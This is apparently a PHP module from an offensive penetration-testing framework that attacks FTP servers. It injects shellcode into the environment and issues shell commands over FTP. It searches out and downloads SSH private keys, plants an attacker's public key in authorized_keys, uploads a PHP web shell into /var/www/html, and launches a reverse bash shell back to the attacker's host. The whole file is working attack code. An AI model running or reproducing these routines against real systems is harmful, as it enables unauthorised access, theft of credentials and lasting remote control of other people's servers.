<?php
class check4linux8protocol extends AUTH{
    
    

    
    
    public function __construct($stream,$eth,$domain,$ip,$port,$protocol) {
        parent::__construct($stream,$eth,$domain,$ip,$port,$protocol);
    }
 
    
    function shellcode2env4raw($nops,$shellcode_raw) {
        $this->ssTitre("PUT Shellcode in ENV");
        $shellcode_raw = trim($shellcode_raw);
        $shell = str_repeat("\x90", $nops);
        $shell .= $shellcode_raw;
        $this->cmd("localhost", "export shellcode=$shell");
        putenv("shellcode=$shell");
        $this->ssTitre("Check Shellcode in ENV");
        // article("Remarque","Shellcode doit etre en raw");
        $this->requette("env | grep 'shellcode' ");
    }
    
    
    
    
    public function ftp2cmd($ftp_stream,$remote_username_ftp, $remote_userpass_ftp){
        $this->ssTitre(__FUNCTION__);
        $this->stream2info($ftp_stream);
        $this->pause();
        
        $command = "! /bin/bash -c id";
        echo $this->chaine(ftp_raw($ftp_stream, $command));
        $this->pause();
        
        $template_shell = "wget --ftp-user='$remote_username_ftp' --ftp-password='$remote_userpass_ftp' \"ftp://$this->ip:$this->port/\"  --execute '%SHELL%' --tries=2 --no-check-certificate -qO- 2> /dev/null   ";
        $templateB64_shell = base64_encode($template_shell);
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        $shell = "/bin/bash";
        $cmd_rev  = $this->url2encode($this->rev8sh($attacker_ip, $attacker_port, $shell));
        $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);
        
        $lprotocol = 'T' ;
        $type = "server";
        //$this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
        
    }
    
    
    public function ftp2shell($ftp_stream,$remote_username_ftp, $remote_userpass_ftp){
        $this->ssTitre(__FUNCTION__);
        $this->ftp2cmd($ftp_stream,$remote_username_ftp, $remote_userpass_ftp);$this->pause();
        $this->ftp2keys($ftp_stream,$remote_username_ftp, $remote_userpass_ftp);$this->pause();
        $this->ftp2upload($ftp_stream);$this->pause();
        
    }
    
    
    public function ftp2dir($ftp_stream){
        $this->ssTitre(__FUNCTION__);
        
        
        $tab_dir_path = array();
        
        
        $base = ftp_pwd($ftp_stream);
        $this->article("PWD FTP", $base);
        
        $ftp_rawlist_racine = ftp_rawlist($ftp_stream,"-a");
        //var_dump($ftp_rawlist_racine);
        foreach ($ftp_rawlist_racine as $v) {
            $info = array();
            $vinfo = preg_split("/[\s]+/", $v, 9);
            if ($vinfo[0] !== "total") {
                $info['chmod'] = $vinfo[0];
                $info['num'] = $vinfo[1];
                $info['owner'] = $vinfo[2];
                $info['group'] = $vinfo[3];
                $info['size'] = $vinfo[4];
                $info['month'] = $vinfo[5];
                $info['day'] = $vinfo[6];
                $info['time'] = $vinfo[7];
                $info['name'] = $vinfo[8];
                $info['path'] = $base.$vinfo[8];
                $rawlist[$info['name']] = $info;
            }
        }
        $dir = array();
        
        foreach ($rawlist as $k => $v) {
            if ($v['chmod']{0} == "d") {
                $dir[$k] = $v;
            }
        }
        
        foreach ($dir as $dirname => $dirinfo) {
            echo "[ $dirname ] " . $dirinfo['chmod'] . " | " . $dirinfo['owner'] . " | " . $dirinfo['group'] . " | " . $dirinfo['month'] . " " . $dirinfo['day'] . " " . $dirinfo['time'] . "\n";
            if ($dirname!=="." && $dirname!==".." && !empty($dirname) ){
                $tab_dir_path[] = $dirname;
                $this->article("dir test", $dirname);
                ftp_chdir($ftp_stream,  "$base$dirname");
                $ftp_rawlist_dir = ftp_rawlist($ftp_stream,"-a");
                echo $this->tab($ftp_rawlist_dir);
                foreach ($ftp_rawlist_dir as $v) {
                    $info = array();
                    $vinfo = preg_split("/[\s]+/", $v, 9);
                    if ($vinfo[0] !== "total") {
                        $info['chmod'] = $vinfo[0];
                        $info['num'] = $vinfo[1];
                        $info['owner'] = $vinfo[2];
                        $info['group'] = $vinfo[3];
                        $info['size'] = $vinfo[4];
                        $info['month'] = $vinfo[5];
                        $info['day'] = $vinfo[6];
                        $info['time'] = $vinfo[7];
                        $info['name'] = $vinfo[8];
                        $info['path'] = "$base$dirname".$vinfo[8];
                        $rawlist[$info['name']] = $info;
                    }
                }
                
                
            }
        }
        
        
        ftp_chdir($ftp_stream, $base);
        return $tab_dir_path;
        
    }
    
    
    public function ftp2keys($ftp_stream, $remote_username_ftp, $remote_userpass_ftp){
        $this->ssTitre(__FUNCTION__);
        $this->ftp2keys2get($ftp_stream, $remote_username_ftp, $remote_userpass_ftp);
        //$this->ftp2keys2add($ftp_stream, $remote_username_ftp, $remote_userpass_ftp);
        
    }
    
    
    public function ftp2keys2get4list($ftp_stream, $remote_username_ftp, $remote_userpass_ftp){
        $this->ssTitre(__FUNCTION__);
        $result = "";
        
    }
    
    
    
    public function ftp2keys2get($ftp_stream, $remote_username_ftp, $remote_userpass_ftp){
        $this->ssTitre(__FUNCTION__);
        $result = "";
        $private_keys_str = "";
        
        $ssh_ports = $this->ip2ports4service("ssh");
        foreach ($ssh_ports as $ssh_open)
            if(!empty($ssh_open)) {
                $remote_privkey_filepath = "";

               
                $tab_dir = $this->ftp2dir($ftp_stream);
                $this->tab($tab_dir);
                $this->pause();
                $this->ssTitre("Searching Private keys");
                $tab_files = $this->ftp2files($ftp_stream);
                $this->tab($tab_files);
                
                $this->pause();
                foreach ($tab_files as $file_check ){
                    $file_check = trim($file_check);
                    if (strstr($file_check, "id_rsa")!==FALSE) {
                        $type_crypt = "rsa";
                        $remote_privkey_filepath = $file_check;
                    }
                    if (strstr($file_check, "id_dsa")!==FALSE) {
                        $type_crypt = "dsa";
                        $remote_privkey_filepath = $file_check;
                    }
                }
                
                $this->article("PATH privkey", $remote_privkey_filepath);
                $this->pause();

 
                
                
                if (!empty($remote_privkey_filepath)){
                    $this->article("FTP GET", $remote_privkey_filepath);
                    $filaname = sha1("$this->port2id.$remote_username_ftp.$remote_userpass_ftp.$remote_privkey_filepath");
                    ftp_get($ftp_stream, "/tmp/$filaname.priv",$remote_privkey_filepath, FTP_ASCII);
                    
                    $query = "cat /tmp/$filaname.priv";
                    $private_keys_str8tmp = trim($this->req_ret_str($query));
                    $private_keys_str = $this->key2norme8str($private_keys_str8tmp,$type_crypt);
                    $this->pause();

                    
                    $this->key4pentest8attacker("",$private_keys_str,$ssh_open,$type_crypt);
                }
                $this->pause();
            }
        else {
            $chaine = "No SSH Service On This Host";
            $this->log2error($chaine);
        }
        
        return $result;
    }
    
    
    
    public function ftp2keys2add($ftp_stream, $remote_username_ftp, $remote_userpass_ftp){
        $this->ssTitre(__FUNCTION__);
        $result = "";
        
        $ssh_ports = $this->ip2ports4service("ssh");
        foreach ($ssh_ports as $ssh_open)
            if(!empty($ssh_open)) {
                $remote_authorized_keys_filepath = "";
                $public_authorized_keys_str2use = "";
                //$remote_username_ftp  $remote_userpass_ftp, $remote_username2use, $racine_ftp
                
                $tab_dir = $this->ftp2dir($ftp_stream);
                $str_dir = $this->tab($tab_dir);
                $this->pause();
                $this->ssTitre("Searching authorized_keys");
                $tab_files = $this->ftp2files($ftp_stream);
                $str_files = $this->tab($tab_files);
                
                $this->pause();
                foreach ($tab_files as $file_check ){
                    $file_check = trim($file_check);
                    if (strstr($file_check, "authorized_keys")!==FALSE) $remote_authorized_keys_filepath = $file_check;
                }
                
                $this->article("PATH authorized_keys", $remote_authorized_keys_filepath);
                $this->pause();
                
                $racine_ftp = ftp_pwd($ftp_stream);
                
                $type_crypt = "rsa";
                $private_keys_str = $this->key2gen4priv2str("",$type_crypt);
                $public_authorized_keys_str2use = $this->key2gen4public2str("",$private_keys_str,$type_crypt);
                

                
                if (empty($remote_authorized_keys_filepath)){
                    
                    ftp_mkdir($ftp_stream, "$racine_ftp.ssh");
                    
                    $ftp_rawlist_racine = ftp_rawlist($ftp_stream,"-a");
                    echo $this->tab($ftp_rawlist_racine);
                    
                    $tmp = ftp_rawlist($ftp_stream, "$racine_ftp",TRUE);
                    if (!$tmp) echo $tmp ;
                    
                    $query = "echo '$public_authorized_keys_str2use' >> /tmp/authorized_keys";
                    $this->requette($query);
                    ftp_put($ftp_stream, "$racine_ftp.ssh/authorized_keys", "/tmp/authorized_keys", FTP_ASCII);
                    
                    
                    var_dump(ftp_rawlist($ftp_stream, "$racine_ftp.ssh/",TRUE));
                    if (!$tmp) echo $tmp ;
                    
                    ftp_chdir($ftp_stream,"$racine_ftp.ssh/");
                    $ftp_rawlist_racine = ftp_rawlist($ftp_stream,"-a");
                    $files_list_str = $this->tab($ftp_rawlist_racine);
                    echo $files_list_str;
                    
                    if (strstr($files_list_str, "authorized_keys")!==FALSE) $remote_authorized_keys_filepath = "$racine_ftp/.ssh/authorized_keys";
                    
                    $this->pause();
                    
                    ftp_chdir($ftp_stream,"$racine_ftp");
                }
                
                if (!empty($remote_authorized_keys_filepath)){
                    $this->article("FTP GET", $remote_authorized_keys_filepath);
                    ftp_get($ftp_stream, "/tmp/authorized_keys_get",$remote_authorized_keys_filepath, FTP_ASCII);
                    
                    $query = "cat /tmp/authorized_keys_get";
                    $public_keys_found = trim($this->req_ret_str($query));
                    $this->pause();
                    
                    
                    if(stristr($public_authorized_keys_str2use,$public_keys_found)!==FALSE) {
                        $this->log2succes("FOUND Public key - already exist");
                        echo "Public key already exist\n";
                        $result .= "Public key already exist\n";
                    }
                    else {
                        $chaine = "Public key added\n";
                        $this->note($chaine);
                        $query = " echo '$public_authorized_keys_str2use' | tee -a /tmp/authorized_keys_get";
                        $this->req_ret_str($query);
                        ftp_put($ftp_stream,$remote_authorized_keys_filepath, "/tmp/authorized_keys_get", FTP_ASCII);
                        
                        
                    }
                    $this->pause();
                    
                    // ftp_site($conn, 'CHMOD 0600 /home/user/privatefile')
                    
                    $this->key4pentest8attacker("",$private_keys_str,$ssh_open,$type_crypt);
                    
                    
                    
                    
                }
                $this->pause();
            }
        else {
            $chaine = "No SSH Service On This Host";
            $this->log2error($chaine);
        }
        
        return $result;
    }
    
    
    
    public function ftp2files($ftp_stream){
        $this->ssTitre(__FUNCTION__);
        $tab_files_path = array();
        
        
        
        $base = ftp_pwd($ftp_stream);
        $this->article("PWD FTP", $base);
        
        $ftp_rawlist_racine = ftp_rawlist($ftp_stream,"-a");
        //var_dump($ftp_rawlist_racine);
        foreach ($ftp_rawlist_racine as $v) {
            $info = array();
            $vinfo = preg_split("/[\s]+/", $v, 9);
            if ($vinfo[0] !== "total") {
                $info['chmod'] = $vinfo[0];
                $info['num'] = $vinfo[1];
                $info['owner'] = $vinfo[2];
                $info['group'] = $vinfo[3];
                $info['size'] = $vinfo[4];
                $info['month'] = $vinfo[5];
                $info['day'] = $vinfo[6];
                $info['time'] = $vinfo[7];
                $info['name'] = $vinfo[8];
                $info['path'] = "$base".$vinfo[8];
                $rawlist[$info['name']] = $info;
            }
        }
        $dir = array();
        $file = array();
        foreach ($rawlist as $k => $v) {
            if ($v['chmod']{0} == "d") {
                $dir[$k] = $v;
            } elseif ($v['chmod']{0} == "-") {
                $file[$k] = $v;
            }
        }
        
        foreach ($dir as $dirname => $dirinfo) {
            echo "[ $dirname ] " . $dirinfo['chmod'] . " | " . $dirinfo['owner'] . " | " . $dirinfo['group'] . " | " . $dirinfo['month'] . " " . $dirinfo['day'] . " " . $dirinfo['time'] . "\n";
            if ($dirname!=="." && $dirname!==".." ){
                ftp_chdir($ftp_stream, $dirname);
                $ftp_rawlist_dir = ftp_rawlist($ftp_stream,"-a");
                echo $this->tab($ftp_rawlist_dir);
                foreach ($ftp_rawlist_dir as $v) {
                    $info = array();
                    $vinfo = preg_split("/[\s]+/", $v, 9);
                    if ($vinfo[0] !== "total") {
                        $info['chmod'] = $vinfo[0];
                        $info['num'] = $vinfo[1];
                        $info['owner'] = $vinfo[2];
                        $info['group'] = $vinfo[3];
                        $info['size'] = $vinfo[4];
                        $info['month'] = $vinfo[5];
                        $info['day'] = $vinfo[6];
                        $info['time'] = $vinfo[7];
                        $info['name'] = $vinfo[8];
                        $info['path'] = "$base$dirname/".$vinfo[8];
                        $rawlist[$info['name']] = $info;
                    }
                }
                
                //var_dump($rawlist);
                foreach ($rawlist as $k => $v) {
                    if ($v['chmod']{0} == "-") {
                        $file[$k] = $v;
                    }
                }
                
                ftp_chdir($ftp_stream, $base);
            }
        }
        
        foreach ($file as $filename => $fileinfo) {
            //echo "$filename " . $fileinfo['chmod'] . " | " . $fileinfo['owner'] . " | " . $fileinfo['group'] . " | " . $fileinfo['size'] . " Byte | " . $fileinfo['month'] . " " . $fileinfo['day'] . " " . $fileinfo['time'] . "\n";
            $this->article($fileinfo['path'], $fileinfo['size']." Byte ");
            $tab_files_path[] = $fileinfo['path'];
        }
        
        
        
        
        
        
        return $tab_files_path;
        
    }
    
    
    public function ftp2upload($ftp_stream){
        $this->ssTitre(__FUNCTION__);
        
        $http_ports = $this->ip2ports4service("http");
        foreach ($http_ports as $http_open)
            if(!empty($http_open)) {
                $tab_dir = $this->ftp2dir($ftp_stream);
                foreach ($tab_dir as $dir){
                    if (strstr($dir, "/var/www/html")!==FALSE){
                        $this->log2succes("Found WebServer repository ");
                        
                        $this->requette("echo '<?php system(\\\$_REQUEST[\"cmd\"]);?>' > /tmp/system_request.php " );
                        ftp_put($ftp_stream, "/tmp/system_request.php", "$dir/system_request.php", FTP_ASCII);
                        $template_shell = "wget --user-agent='$this->user2agent' \"http://$this->ip:$http_open/system_request.php?cmd=%SHELL%\" --tries=2 --no-check-certificate -qO- 2> /dev/null   ";
                        $templateB64_shell = base64_encode($template_shell);
                        $attacker_ip = $this->ip4addr4target($this->ip);
                        $attacker_port = rand(1024,65535);
                        $shell = "/bin/bash";
                        $cmd_rev  = $this->url2encode($this->rev8sh($attacker_ip, $attacker_port, $shell));
                        $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);
                        
                        $lprotocol = 'T' ;
                        $type = "server";
                        $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
                    }
                }
                
            }
        
        
    }
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
}
?>